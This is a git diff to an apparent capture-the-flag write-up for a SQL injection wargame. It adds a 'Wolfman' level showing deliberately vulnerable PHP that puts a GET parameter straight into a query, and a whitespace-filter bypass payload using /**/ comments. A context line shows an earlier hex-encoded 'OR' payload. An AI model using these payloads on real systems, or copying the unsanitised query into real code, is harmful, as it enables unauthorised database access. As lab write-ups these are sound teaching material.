@@ -83,7 +83,7 @@ Here it the level will be solved if we fetch the row with id = admin but in the 
 
 **Payload : 1 OR id=0x61646D696E;-- -**
 
-# Level 3 - Orc
+# Level 4 - Orc
 
 
 
@@ -145,3 +145,28 @@ while 1:
         print(q)
         print(f'Password : {pw}{i}',end='\r')
 ```
+##  Level 5 - Wolfman
+
+##### Source code
+
+
+```php=
+<?php 
+  include "./config.php"; 
+  login_chk(); 
+  $db = dbconnect(); 
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
+  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
+  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
+  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
+  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
+  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
+  if($result['id'] == 'admin') solve("wolfman"); 
+  highlight_file(__FILE__); 
+?>
+```
+
+##### Here quotes are being blocked . So to get around that we can use /**/ wherever space is needed since mysql treats this as spaces .
+
+##### So the payload becomes : pw='/\**/or/**/id='admin
+
